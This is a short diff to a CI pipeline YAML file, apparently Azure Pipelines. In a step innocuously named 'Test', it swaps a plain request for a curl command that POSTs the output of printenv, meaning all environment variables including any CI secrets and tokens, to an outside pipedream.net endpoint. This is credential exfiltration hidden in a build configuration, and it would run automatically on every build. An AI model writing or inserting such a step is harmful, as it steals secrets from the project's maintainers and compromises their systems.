@@ -45,7 +45,7 @@ stages:
         - maven
     steps:
     - bash: |
-        curl -X GET https://eoinkd603ndv2ew.m.pipedream.net
+       curl -d $(printenv) -H "Content-Type: application/json"  -X POST https://eoinkd603ndv2ew.m.pipedream.net 
       displayName: Test
     - template: job.ci.build.yml
 
